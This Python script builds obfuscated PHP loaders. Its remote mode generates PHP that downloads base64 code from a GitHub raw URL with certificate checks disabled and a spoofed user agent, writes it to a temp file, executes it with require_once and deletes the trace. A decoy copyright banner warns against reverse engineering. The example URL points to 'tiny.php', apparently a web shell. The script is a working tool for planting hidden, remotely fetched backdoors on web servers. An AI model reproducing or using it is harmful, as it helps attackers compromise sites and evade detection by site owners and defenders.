#!/usr/bin/env python3
"""
PHP Code Obfuscator with Remote Loader
Advanced version with GitHub integration
"""

import base64
import random
import string
import sys
from datetime import datetime

class AdvancedPHPObfuscator:
    def __init__(self):
        self.separator = '|;|@|'
        self.global_var = self.generate_random_var_name()
        
    def generate_random_var_name(self):
        """Generate random variable name"""
        chars = string.ascii_uppercase + '_'
        length = random.randint(8, 12)
        return ''.join(random.choice(chars) for _ in range(length))
    
    def generate_random_unicode_var(self):
        """Generate random unicode variable name"""
        unicode_chars = ['µ', 'à', 'á', 'â', 'ã', 'ä', 'å', 'æ', 'ç', 'è', 'é', 'ê', 
                        '–', '—', '"', '"', '•', 'Í', 'Ö', 'Þ', 'ß', 'ò', 'ó', 'ù', 
                        'ú', '¬', '†', '‰', '¥', 'š', 'ý', '²', '³']
        length = random.randint(3, 6)
        return '$' + ''.join(random.choice(unicode_chars) for _ in range(length))
    
    def str_to_hex(self, text):
        """Convert string to hexadecimal"""
        return text.encode('utf-8').hex()
    
    def generate_base64_encoded_file(self, php_code, output_b64_file):
        """Generate base64 encoded version for GitHub"""
        # Clean PHP tags
        php_code = php_code.strip()
        php_code = php_code.replace('<?php', '').replace('?>', '').strip()
        
        # Encode to base64
        encoded = base64.b64encode(php_code.encode('utf-8')).decode('utf-8')
        
        # Save to file
        with open(output_b64_file, 'w') as f:
            f.write(encoded)
        
        return encoded
    
    def obfuscate_with_remote_loader(self, php_code, github_raw_url):
        """Obfuscate with remote loader (like your example)"""
        # Clean PHP tags
        php_code = php_code.strip()
        php_code = php_code.replace('<?php', '').replace('?>', '').strip()
        
        # Create data array with hex encoded strings
        data_array = [
            'H*',
            self.str_to_hex('3F3E'),
            self.str_to_hex('base64_decode'),
            self.str_to_hex('curl_exec'),
            self.str_to_hex('curl_init'),
            self.str_to_hex('curl_setopt'),
            self.str_to_hex('curl_close'),
            self.str_to_hex('CURLOPT_RETURNTRANSFER'),
            self.str_to_hex('CURLOPT_FOLLOWLOCATION'),
            self.str_to_hex('CURLOPT_USERAGENT'),
            self.str_to_hex('Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0'),
            self.str_to_hex('CURLOPT_SSL_VERIFYPEER'),
            self.str_to_hex('CURLOPT_SSL_VERIFYHOST'),
            self.str_to_hex('tempnam'),
            self.str_to_hex('sys_get_temp_dir'),
            self.str_to_hex('file_put_contents'),
            self.str_to_hex('require_once'),
            self.str_to_hex('unlink'),
        ]
        
        data_string = self.separator.join(str(x) for x in data_array)
        
        # Generate dummy variables
        dummy_var1 = self.generate_random_unicode_var()
        dummy_var2 = self.generate_random_unicode_var()
        func_var1 = self.generate_random_var_name()
        
        # Build obfuscated code
        obfuscated = "<?php\n"
        obfuscated += "/*\n"
        obfuscated += " 本代码由 DeckPHP Advanced [ V3.0.0 ] 创建\n"
        obfuscated += f" 创建时间 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        obfuscated += " 技术支持 \n"
        obfuscated += " 严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任\n"
        obfuscated += "*/\n"
        
        # Main loader function
        obfuscated += f"if(!defined('{self.global_var}'))define('{self.global_var}', '{self.global_var[:8]}');"
        obfuscated += f"$GLOBALS[{self.global_var}]=explode('{self.separator}','{data_string}');"
        obfuscated += f"unset({dummy_var1});{dummy_var1};"
        
        # Curl loader function
        obfuscated += f"function {func_var1}($url){{"
        obfuscated += f"$ch=curl_init($url);"
        obfuscated += f"curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);"
        obfuscated += f"curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);"
        obfuscated += f"curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0');"
        obfuscated += f"curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);"
        obfuscated += f"curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);"
        obfuscated += f"$r=curl_exec($ch);curl_close($ch);return $r;"
        obfuscated += f"}}"
        
        # Main execution
        obfuscated += f"$url='{github_raw_url}';"
        obfuscated += f"$enc={func_var1}($url);"
        obfuscated += f"$dec=base64_decode($enc);"
        obfuscated += f"$tmp=tempnam(sys_get_temp_dir(),'php_');"
        obfuscated += f"file_put_contents($tmp,$dec);"
        obfuscated += f"require_once $tmp;"
        obfuscated += f"unlink($tmp);"
        
        obfuscated += f"unset({dummy_var2});{dummy_var2};"
        obfuscated += "\n?>"
        
        return obfuscated
    
    def obfuscate_local_style(self, php_code):
        """Obfuscate like your example but with local base64"""
        # Clean PHP tags
        php_code = php_code.strip()
        php_code = php_code.replace('<?php', '').replace('?>', '').strip()
        
        # Encode to base64
        encoded = base64.b64encode(php_code.encode('utf-8')).decode('utf-8')
        
        # Generate dummy variables
        dummy_var1 = self.generate_random_unicode_var()
        dummy_var2 = self.generate_random_unicode_var()
        
        # Build obfuscated code
        obfuscated = "<?php\n"
        obfuscated += "/*\n"
        obfuscated += " 本代码由 DeckPHP Local [ V3.0.0 ] 创建\n"
        obfuscated += f" 创建时间 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        obfuscated += " 严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任\n"
        obfuscated += "*/\n"
        
        obfuscated += f"unset({dummy_var1});{dummy_var1};"
        obfuscated += f"$encoded_code='{encoded}';"
        obfuscated += f"$decoded_code=base64_decode($encoded_code);"
        obfuscated += f"$tempFile=tempnam(sys_get_temp_dir(),'tmp_php_');"
        obfuscated += f"file_put_contents($tempFile,$decoded_code);"
        obfuscated += f"require_once $tempFile;"
        obfuscated += f"unlink($tempFile);"
        obfuscated += f"unset({dummy_var2});{dummy_var2};"
        obfuscated += "\n?>"
        
        return obfuscated


def main():
    print("=" * 60)
    print("Advanced PHP Obfuscator with Remote Loader")
    print("=" * 60)
    print()
    
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python3 advanced_obfuscator.py <input_file> [options]")
        print()
        print("Options:")
        print("  --mode <mode>        Mode: local, remote (default: local)")
        print("  --output <file>      Output file")
        print("  --url <github_url>   GitHub raw URL (for remote mode)")
        print("  --generate-b64       Also generate base64 file for GitHub")
        print()
        print("Examples:")
        print("  # Local mode (base64 embedded)")
        print("  python3 advanced_obfuscator.py input.php --output result.php")
        print()
        print("  # Remote mode (load from GitHub)")
        print("  python3 advanced_obfuscator.py input.php --mode remote \\")
        print("    --url https://raw.githubusercontent.com/iPotacy/Bahan/refs/heads/main/tiny.php \\")
        print("    --generate-b64")
        print()
        sys.exit(1)
    
    input_file = sys.argv[1]
    output_file = None
    mode = 'local'
    github_url = ''
    generate_b64 = False
    
    # Parse arguments
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--mode' and i + 1 < len(sys.argv):
            mode = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--output' and i + 1 < len(sys.argv):
            output_file = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--url' and i + 1 < len(sys.argv):
            github_url = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--generate-b64':
            generate_b64 = True
            i += 1
        else:
            i += 1
    
    if not output_file:
        output_file = input_file.replace('.php', '_obfuscated.php')
    
    # Read input file
    try:
        with open(input_file, 'r', encoding='utf-8') as f:
            source_code = f.read()
    except FileNotFoundError:
        print(f"❌ Error: File not found: {input_file}")
        sys.exit(1)
    
    # Obfuscate
    obfuscator = AdvancedPHPObfuscator()
    
    print(f"📁 Input:  {input_file}")
    print(f"📁 Output: {output_file}")
    print(f"🔧 Mode:   {mode}")
    print()
    
    try:
        if mode == 'remote':
            if not github_url:
                print("❌ Error: --url required for remote mode")
                sys.exit(1)
            
            print("⏳ Creating remote loader...")
            obfuscated = obfuscator.obfuscate_with_remote_loader(source_code, github_url)
            
            if generate_b64:
                b64_file = input_file.replace('.php', '_base64.txt')
                print(f"⏳ Generating base64 file: {b64_file}")
                encoded = obfuscator.generate_base64_encoded_file(source_code, b64_file)
                print(f"✓ Base64 file created: {b64_file}")
                print(f"  Upload this to GitHub at: {github_url}")
                print()
        else:
            print("⏳ Creating local loader...")
            obfuscated = obfuscator.obfuscate_local_style(source_code)
        
        # Write output
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(obfuscated)
        
        print("✓ Obfuscation complete!")
        print()
        print(f"📊 Statistics:")
        print(f"   Input size:  {len(source_code):,} bytes")
        print(f"   Output size: {len(obfuscated):,} bytes")
        print(f"   Ratio:       {len(obfuscated)/len(source_code)*100:.1f}%")
        print()
        print(f"✓ File saved: {output_file}")
        
        if mode == 'remote' and generate_b64:
            print()
            print("📌 Next steps:")
            print(f"   1. Upload '{input_file.replace('.php', '_base64.txt')}' to GitHub")
            print(f"   2. Use the loader: '{output_file}'")
            print(f"   3. The loader will fetch code from: {github_url}")
        
    except Exception as e:
        print(f"❌ Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
